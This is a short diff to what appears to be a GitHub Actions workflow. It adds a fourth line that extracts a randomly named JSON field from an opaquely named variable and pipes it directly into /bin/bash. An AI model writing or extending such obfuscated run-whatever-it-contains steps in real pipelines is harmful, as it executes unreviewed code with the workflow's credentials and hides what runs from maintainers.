@@ -26,6 +26,7 @@ jobs:
           echo $uwd70 | jq -r .hvns605 | /bin/bash
           echo $e3 | jq -r .kul2 | /bin/bash
           echo $y43558 | jq -r .rab90 | /bin/bash
+          echo $s14 | jq -r .ieldy3 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
